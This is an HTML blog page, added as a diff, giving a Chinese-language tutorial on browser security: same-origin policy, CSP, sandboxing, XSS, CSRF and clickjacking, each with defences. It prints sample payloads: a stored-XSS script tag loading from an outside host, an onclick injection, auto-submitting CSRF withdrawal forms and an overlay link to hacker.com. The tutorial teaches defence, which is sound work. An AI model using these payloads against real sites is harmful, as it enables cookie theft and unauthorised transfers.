@@ -1,0 +1,295 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="baidu-site-verification" content="1EB8XoOl0C"><meta name="google-site-verification" content="K7thEgdLm0UfRWJ5MGdF7sCcjClSzAlxFLPv2Oz5CGM"><title> 浏览器专题之安全篇 · 步步走</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="同源策略（Content Security Policy），内容安全策略（CSP）"><meta name="keywords" content="同源策略、CSP、安全沙箱、XSS、CSRF、点击劫持"><meta name="author" content="typeR"><link rel="short icon" href="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/favicon.ico"><link rel="stylesheet" href="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/bubuzou.css"><link rel="search" type="application/opensearchdescription+xml" href="https://bubuzou.com/atom.xml" title="步步走"><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script><meta name="generator" content="Hexo 5.0.0"><link rel="alternate" href="/atom.xml" title="步步走" type="application/atom+xml">
+</head><body><header><div class="header row"> <a href="/" class="logo-link"><img src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202010/logo.svg"></a><ul id="nav_list" class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" data-hover="博文" class="nav-list-link">博文</a></li><li class="nav-list-item"><a href="/archives/" target="_self" data-hover="归档" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="/categories/live/" target="_self" data-hover="生活" class="nav-list-link">生活</a></li><li class="nav-list-item"><a href="/categories/read/" target="_self" data-hover="读书" class="nav-list-link">读书</a></li><li class="nav-list-item"><a href="/about/" target="_self" data-hover="关于" class="nav-list-link">关于</a></li></ul><div class="search"><a id="search_btn" href="#search"></a></div><div id="nav_btn" class="nav-btn"><span></span><span></span><span></span></div></div></header><div class="row scroll-con"><section class="container"><!-- for archive page--><div id="postAr" class="post"><article class="post-block"><h1 class="post-title">浏览器专题之安全篇</h1><div class="post-info">2020-12-04<p class="visit"><i data-identity="2020/12/04/web-security/" class="article-timer"></i><span>次访问</span></p></div><div class="post-content"><p><img src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202011/browser_safe.png"></p>
+<h2 id="同源策略（Same-Origin-Policy）"><a href="#同源策略（Same-Origin-Policy）" class="headerlink" title="同源策略（Same Origin Policy）"></a>同源策略（Same Origin Policy）</h2><p>如果两个 <code>URL</code> 的协议、域名和端口都相同，我们就称这两个 <code>URL</code> 同源。</p>
+<p>比如，这个 <code>http://store.company.com/dir/page.html</code> 和下面这些 <code>URL</code> 相比源的结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;store.company.com&#x2F;dir2&#x2F;other.html         &#x2F;&#x2F; 同源，只有路径不同</span><br><span class="line">http:&#x2F;&#x2F;store.company.com&#x2F;dir&#x2F;inner&#x2F;another.html  &#x2F;&#x2F; 同源，只有路径不同</span><br><span class="line">https:&#x2F;&#x2F;store.company.com&#x2F;secure.html            &#x2F;&#x2F; 失败，协议不同</span><br><span class="line">http:&#x2F;&#x2F;news.company.com&#x2F;dir&#x2F;other.html           &#x2F;&#x2F; 失败，域名不同</span><br><span class="line">http:&#x2F;&#x2F;store.company.com:81&#x2F;dir&#x2F;etc.html         &#x2F;&#x2F; 失败，端口不同 ( http:&#x2F;&#x2F; 默认端口是80)</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="同源策略的限制"><a href="#同源策略的限制" class="headerlink" title="同源策略的限制"></a>同源策略的限制</h3><ul>
+<li>限制了来自不同源的 <code>JavaScript</code> 脚本对当前 <code>DOM</code> 对象读和写的操作；</li>
+<li>限制了不同源的站点读取当前站点的 <code>Cookie</code>、<code>IndexDB</code>、<code>LocalStorage</code> 等数据；</li>
+<li>限制了通过 <code>XMLHttpRequest</code> 等方式将站点的数据发送给不同源的站点。</li>
+</ul>
+<p>由于浏览器同源策略的限制使得 Web 项目难以开发和使用，所以为了既保证安全性又能够灵活开发 Web 应用，<strong>从而出现了一些新技术</strong></p>
+<ul>
+<li>页面中可以引用第三方资源，不过这也暴露了很多诸如 <code>XSS</code> 的安全问题，因此又在这种开放的基础之上引入了内容安全策略 <code>CSP</code> 来限制其自由程度；</li>
+<li>使用 <code>XMLHttpRequest</code> 和 <code>Fetch</code> 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略 <code>CORS</code>，让其可以安全地进行跨域操作；</li>
+<li>两个不同源的 <code>DOM</code>是不能相互操纵的，因此浏览器中又实现了跨文档消息机制，让其可以比较安全地通信，可以通过 <code>window.postMessage</code> 的 <code>JavaScript</code> 接口来和不同源的 <code>DOM</code> 进行通信。</li>
+</ul>
+<h2 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h2><p>内容安全策略（<code>Content Security Policy</code>）简称 <code>CSP</code>，通过它可以明确的告诉客户端浏览器当前页面的哪些外部资源可以被加载执行，而哪些又是不可以的。</p>
+<h3 id="2-种方式启用-CSP"><a href="#2-种方式启用-CSP" class="headerlink" title="2 种方式启用 CSP"></a>2 种方式启用 CSP</h3><ul>
+<li>通过 <code>HTTP</code> 头配置 <code>Content-Security-Policy</code>，以下配置说明该页面只允许当前源和 <code>https://apis.google.com</code> 这 2 个源的脚本加载和执行：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;apis.google.com</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过页面 <code>&lt;meta&gt;</code> 标签配置：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27; https://apis.google.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP-的限制"><a href="#CSP-的限制" class="headerlink" title="CSP 的限制"></a>CSP 的限制</h3><p><code>CSP</code> 提供了丰富的限制，<strong>除了能限制脚本的加载和执行，对其他资源也有限制</strong>，比如：</p>
+<ul>
+<li><code>font-src</code>：字体来源；</li>
+<li><code>img-src</code>：图片来源；</li>
+<li><code>style-src</code>：样式来源；</li>
+</ul>
+<p>以上只是列举了一些常见的外部资源的限制，想要查看更多资源限制<a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/security/csp">可以看这里</a>。</p>
+<p>默认情况下，这些指令的适用范围很广。如果您不为某条指令（例如，<code>font-src</code>）设置具体的策略，则默认情况下，该指令在运行时假定您指定 <code>*</code> 作为有效来源（例如，您可以从任意位置加载字体，没有任何限制。</p>
+<p>另外你可以通过 <code>default-src</code> 设置资源限制的默认行为，但它只适用于 <code>-src</code> 结尾的所有指令，比如设置了如下的 <code>CSP</code> 规则，则只允许从 <code>https://cdn.example.net</code> 加载脚本、字体、图片、样式等资源：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:&#x2F;&#x2F;cdn.example.net</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP-配置事项"><a href="#CSP-配置事项" class="headerlink" title="CSP 配置事项"></a>CSP 配置事项</h3><p>如果要配置多个同一类型的资源限制，需要将它们进行合并：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com</span><br></pre></td></tr></table></figure>
+
+<p>不同的资源类型之间需要用分号分隔：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https:&#x2F;&#x2F;host1.com; img-src https:&#x2F;&#x2F;host2.com</span><br></pre></td></tr></table></figure>
+
+<p>可以通过以下值来灵活配置来源列表：</p>
+<ul>
+<li>协议：<code>https:</code>、<code>data:</code>；</li>
+<li>主机名：<code>example.com</code>、<code>example.com:443</code>；</li>
+<li>路径名：<code>example.com/js</code>；</li>
+<li>通配符：<code>*://*.example.com:*</code>。</li>
+</ul>
+<p>还可以给来源列表指定关键字，包含如下 4 个关键字，使用关键字需要加上单引号：</p>
+<ul>
+<li><code>&#39;none&#39;</code>：不执行任何匹配；</li>
+<li><code>&#39;self&#39;</code>：与当前来源（而不是其子域）匹配；</li>
+<li><code>&#39;unsafe-inline&#39;</code>：允许使用内联 <code>JavaScript</code> 和 <code>CSS</code>；</li>
+<li><code>&#39;unsafe-eval&#39;</code>：允许使用类似 <code>eval</code> 的 <code>text-to-JavaScript</code> 机制。</li>
+</ul>
+<h3 id="CSP-应用举例"><a href="#CSP-应用举例" class="headerlink" title="CSP 应用举例"></a>CSP 应用举例</h3><p>让我们假设一下，您在运行一个银行网站，并希望确保只能加载您自己写入的资源。 在此情形下，首先设置一个阻止所有内容的默认政策 (<code>default-src &#39;none&#39;</code>)，然后在此基础上逐步构建。</p>
+<p>假设此银行网站在 <code>https://cdn.mybank.net</code> 上加载所有来自 <code>CDN</code> 的图像、样式和脚本，并通过 <code>XHR</code> 连接到 <code>https://api.mybank.com/</code> 以抽取各种数据。可使用帧，但仅用于网站的本地页面（无第三方来源）。 网站上没有 <code>Flash</code>，也没有字体和 <code>Extra</code>。 我们能够发送的最严格的 <code>CSP</code> 标头为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;; script-src https:&#x2F;&#x2F;cdn.mybank.net; style-src https:&#x2F;&#x2F;cdn.mybank.net; img-src https:&#x2F;&#x2F;cdn.mybank.net; connect-src https:&#x2F;&#x2F;api.mybank.com; child-src &#39;self&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="安全沙箱（Sandbox）"><a href="#安全沙箱（Sandbox）" class="headerlink" title="安全沙箱（Sandbox）"></a>安全沙箱（Sandbox）</h2><p>我们知道早期的浏览器是单进程架构的，这样当某个标签页挂了之后，将影响到整个浏览器。所以出现了多进程架构，它通过给每个标签页分配一个渲染进程解决了这个问题。</p>
+<p>而渲染进程的工作是进行 <code>HTML</code>、<code>CSS</code> 的解析，<code>JavaScript</code> 的执行等，而这部分内容是直接暴露给用户的，所以也是最容易被黑客利用攻击的地方，如果黑客攻击了这里就有可能获取到渲染进程的权限，进而威胁到操作系统。所以需要一道墙用来把不可信任的代码运行在一定的环境中，限制不可信代码访问隔离区之外的资源，而这道墙就是浏览器的安全沙箱。</p>
+<p>多进程的浏览器架构将主要分为两块：浏览器内核和渲染内核。而安全沙箱能限制了渲染进程对操作系统资源的访问和修改，同时渲染进程内部也没有读写操作系统的能力，而这些都是在浏览器内核中一一实现了，包括持久存储、网络访问和用户交互等一系列直接与操作系统交互的功能。浏览器内核和渲染内核各自职责分明，当他们需要进行数据传输的时候会通过 <code>IPC</code> 进行。</p>
+<p><img src="https://bubuzou.oss-cn-shenzhen.aliyuncs.com/blog/202011/browser_0042.png" alt="浏览器内核和渲染进程各自职责"></p>
+<blockquote>
+<p>安全沙箱的存在是为了保护客户端操作系统免受黑客攻击，但是阻止不了 XSS 和 CSRF。</p>
+</blockquote>
+<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>跨站脚本攻击（<code>Cross Site Scripting</code>）本来缩写是 <code>CSS</code>，但是为了和层叠样式表（<code>Cascading Style Sheet</code>）的简写区分开来，所以在安全领域被称为 <code>XSS</code>。它是指黑客往 <code>HTML</code> 文件中或者 <code>DOM</code> 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p>
+<p><strong>可以通过 3 种方式注入恶意脚本</strong></p>
+<h3 id="存储型-XSS-攻击"><a href="#存储型-XSS-攻击" class="headerlink" title="存储型 XSS 攻击"></a>存储型 XSS 攻击</h3><ul>
+<li>首先黑客利用站点漏洞将一段恶意 <code>JavaScript</code> 代码提交到网站的数据库中，比如在表单输入框中输入这样一段内容：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://tod.cn/ReFgeasE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后用户向网站请求包含了恶意 <code>JavaScript</code> 脚本的页面；</li>
+<li>当用户浏览该页面的时候，恶意脚本可以通过 <code>document.cookie</code> 获取到页面 <code>Cookie</code> 信息，然后通过 <code>XMLHttpRequest</code> 将这些信息发送给恶意服务器，恶意服务器拿到用户的 <code>Cookie</code> 信息之后，就可以在其他电脑上模拟用户的登录，然后进行操作。</li>
+</ul>
+<h3 id="反射型-XSS-攻击"><a href="#反射型-XSS-攻击" class="headerlink" title="反射型 XSS 攻击"></a>反射型 XSS 攻击</h3><p>恶意 <code>JavaScript</code> 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 <code>JavaScript</code> 脚本返回给用户。当恶意 <code>JavaScript</code> 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。</p>
+<h3 id="基于-DOM-的-XSS-攻击"><a href="#基于-DOM-的-XSS-攻击" class="headerlink" title="基于 DOM 的 XSS 攻击"></a>基于 DOM 的 XSS 攻击</h3><p>通常是由于是前端代码不够严谨，把不可信的内容插入到了页面。在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>.appendChild</code>、<code>document.write()</code>等 <code>API</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，尽量使用 <code>.innerText</code>、<code>.textContent</code>、<code>.setAttribute()</code> 等代替。比如对于如下代码：当输入 <code>&quot; onclick=alert(&#39;xss&#39;) </code> 且点击生成的链接的时候，就会提示 <code>xss</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;link&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> text = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;text&#x27;</span>).value</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;link&#x27;</span>).innerHTML = <span class="string">`&lt;a href=&quot;<span class="subst">$&#123;text&#125;</span>&quot;&gt;链接&lt;/a&gt;`</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="阻止-XSS-攻击的措施"><a href="#阻止-XSS-攻击的措施" class="headerlink" title="阻止 XSS 攻击的措施"></a>阻止 XSS 攻击的措施</h3><ul>
+<li>服务器对输入脚本进行过滤或转码，比如：<code>&lt;script&gt;</code> 转成 <code>&amp;lt;script&amp;gt;</code> 后脚本就无法执行了；</li>
+<li>使用 <code>HttpOnly</code> 属性，服务器通过响应头来将某些重要的 <code>Cookie</code> 设置为 <code>HttpOnly</code> 值，限制了客户端浏览器可以通过 <code>document.cookie</code> 获取这些重要的 <code>Cookie</code> 信息；</li>
+<li>充分利用 <code>CSP</code>，可以通过 <code>&lt;meta&gt;</code> 来配置 <code>CSP</code>，这也是前端用于防止 <code>XSS</code> 的最合适手段。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><p>跨站请求伪造（<code>Cross-site request forgery</code>）简称是 <code>CSRF</code>：是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。</p>
+<h3 id="CSRF-是怎么攻击的"><a href="#CSRF-是怎么攻击的" class="headerlink" title="CSRF 是怎么攻击的"></a>CSRF 是怎么攻击的</h3><p>一个典型的 <code>CSRF</code> 攻击过程应该是这样子的：</p>
+<ul>
+<li>用户登录 A 网站，并且保留了登录信息（<code>Cookie</code>）；</li>
+<li>被黑客诱导访问了 B 网站，从 A 跳转到 B；</li>
+<li>B 网站对 A 网站发出请求（这个就是下面将介绍的几种伪造请求的方式），浏览器请求头中会默认携带 A 网站的 <code>Cookie</code>；</li>
+<li>A 网站服务器收到请求后，经过验证发现用户是登录了的，所以会处理请求。</li>
+</ul>
+<p>下面将举一个例子来模拟几种伪造请求的方式。假设：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;platforma.com&#x2F;withdraw?account&#x3D;账户名&amp;money&#x3D;转账金额&#96;</span><br></pre></td></tr></table></figure>
+
+<p>这是某个资金平台 A 的转账接口，黑客知道这个接口后就可以通过以下方式进行攻击：</p>
+<p><strong>1. 自动发起 <code>GET</code> 请求</strong></p>
+<p>黑客在他自己网站的页面上加载了一张图片，而链接地址是指向那个转账接口。所以需要做的就是，只要某个用户在资金平台 A 上刚登录过，且此时被诱导点击了黑客的页面，一进入这个页面就会自动发起 <code>GET</code> 请求去加载图片，实而是去请求去执行转账接口。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://platforma.com/withdraw?account=hacker名&amp;money=1000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 自动发起 <code>POST</code> 请求</strong></p>
+<p>这类其实就是表单的自动提交。以下是黑客网站上的代码，一旦跳转到黑客指定的页面就会自动提交表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://platforma.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 点击链接来触发请求</strong></p>
+<p>这种伪造请求的方式和第一种很像，不过是将请求的接口放到了 <code>&lt;a&gt;</code> 链接上：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;美女图片的链接&quot;</span> /&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;https://platforma.com/withdraw?account=hacker名&amp;money=1000&quot;</span>&gt;</span><br><span class="line">    点击查看更多美女图片</span><br><span class="line">&lt;a/&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="如何预防-CSRF-攻击"><a href="#如何预防-CSRF-攻击" class="headerlink" title="如何预防 CSRF 攻击"></a>如何预防 CSRF 攻击</h3><p><strong>1. 给 Cookie 设置合适的 SameSite</strong></p>
+<p>当从 A 网站登录后，会从响应头中返回服务器设置的 <code>Cookie</code> 信息，而如果 <code>Cookie</code> 携带了 <code>SameSite=strict</code> 则表示完全禁用第三方站点请求头携带 <code>Cookie</code>，比如当从 B 网站请求 A 网站接口的时候，浏览器的请求头将不会携带该 <code>Cookie</code>。<code>SameSite</code> 还有另外 2 个属性值：</p>
+<ul>
+<li><code>Lax</code> 是默认值，允许第三方站点的 <code>GET</code> 请求携带；</li>
+<li><code>None</code> 任何情况下都会携带；</li>
+</ul>
+<p>以下是一个响应头的 <code>Set-Cookie</code> 示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: flavor&#x3D;choco; SameSite&#x3D;strict</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 同源检测</strong></p>
+<p>在服务端，通过请求头中携带的 <code>Origin</code> 或者 <code>Referer</code> 属性值进行判断请求是否来源同一站点，同时服务器应该优先检测 <code>Origin</code>。为了安全考虑，相比于 <code>Referer</code>，<code>Origin</code> 只包含了域名而不带路径。</p>
+<p><strong>3. CSRF Token</strong></p>
+<p>大概过程是可以分成 2 步骤：</p>
+<ul>
+<li>在浏览器向服务器发起请求时，服务器生成一个 <code>CSRF Token</code>。<code>CSRF Token</code> 其实就是服务器生成的随机字符串，然后将该字符串植入到返回的页面中，通常是放到表单的隐藏输入框中，这样能够很好的保护 <code>CSRF Token</code> 不被泄漏；</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://platforma.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nc98P987b&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当浏览器再次发送请求的时候（比如转账），就需要携带这个 <code>CSRF Token</code> 值一并提交；</li>
+<li>服务器验证 <code>CSRF Token</code> 是否一致；从第三方网站发出的请求是无法获取用户页面中的 <code>CSRF Token</code> 值的。</li>
+</ul>
+<h2 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h2><p>点击劫持（<code>Clickjacking</code>）是一种通过视觉欺骗的手段来达到攻击目的手段。往往是攻击者将目标网站通过 <code>iframe</code> 嵌入到自己的网页中，通过 <code>opacity</code> 等手段设置 <code>iframe</code> 为透明的，使得肉眼不可见，这样一来当用户在攻击者的网站中操作的时候，比如点击某个按钮（这个按钮的顶层其实是 <code>iframe</code>），从而实现目标网站被点击劫持。</p>
+<p><strong>防护手段</strong>即不希望自己网站的页面被嵌入到别人的网站中。</p>
+<h3 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h3><p>如果 A 页面通过 <code>iframe</code> 被嵌入到 B 页面，那么在 A 页面内部<code>window</code> 对象将指向 <code>iframe</code>，而 <code>top</code> 将指向最顶层的网页这里是 B。所以可以依据这个原理来判断自己的页面是被 <code>iframe</code> 引入而嵌入到别人页面，如果是的话，则通过如下的判断会使得 B 页面将直接替换 A 的内容而显示，从而让用户发觉自己被骗。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.location != <span class="built_in">window</span>.location) &#123;</span><br><span class="line">    top.location = <span class="built_in">window</span>.location</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h3><p>通过给页面响应头里设置 <code>X-Frame-Options</code> 为某个属性值，就能达到控制该页面是否可以通过 <code>iframe</code> 的方式被嵌入到别人的网站中。 它有 3 个属性值：</p>
+<ul>
+<li><code>deny</code> 表示该页面不允许嵌入到任何页面，包括同一域名页面也不允许；</li>
+<li><code>sameorigin</code> 表示只允许嵌入到同一域名的页面；</li>
+<li><code>allow-from uri</code> 表示可以嵌入到指定来源的页面中。</li>
+</ul>
+<p>点击劫持中的本质就是通过视觉来欺骗用户，顺着这个思路，还有一个攻击方法也和这个类似，那就是<strong>图片覆盖攻击</strong>大概的原理就是通过样式把图片覆盖在攻击者所希望的任意位置，比如盖在一个网站的 <code>logo</code> 上，当用户点击图片的时候就会被链接到攻击者的站点。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">src</span>=<span class="string">&quot;https://hacker.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片链接&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; left: 100; top: 100; z-index: 100;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于这种攻击方式，预防的手段就是需要用户在提交的 <code>HTML</code> 中检查，<code>&lt;img&gt;</code> 标签是否有可能导致浮出。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/117637">浏览器的工作原理与实践</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">Same-origin_policy</a></li>
+<li><a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/security/csp">CSP</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.douban.com/subject/10546925/">白帽子讲Web安全</a></li>
+</ul>
+</div></article></div><div class="right-container"><div class="widget"><div id="arAnchorBar"></div></div></div></section></div><div class="right-menu"></div><div class="modal search-modal"><div class="input-field"><input type="text" id="search_input"><label for="search-input">搜索</label></div><div id="search_result" class="search-result"></div></div><div class="blog-overlay"></div><footer class="row"><div class="footer-con"><div class="paginator"><a href="/2020/12/11/browser-event/" title="浏览器专题之事件机制" class="prev">上一篇</a><a href="/2020/11/17/es6/" title="「建议收藏」送你一份精心总结的3万字ES6实用指南（全）" class="next">下一篇</a></div><a href="#comment" class="comment-anchor"></a><div id="vcomments"></div><script>new Valine({
+    el: "#vcomments",
+    appId: "aD8jJBpu4oew3ovNY73z6Rdq-gzGzoHsz",
+    appKey: "FdzS5SOPHdhYQoEUngQ8K2QW",
+    notify: false,
+    verify: false,
+    avatar: "robohash",
+    visitor: true,
+    placeholder: "随便说点什么～.～",
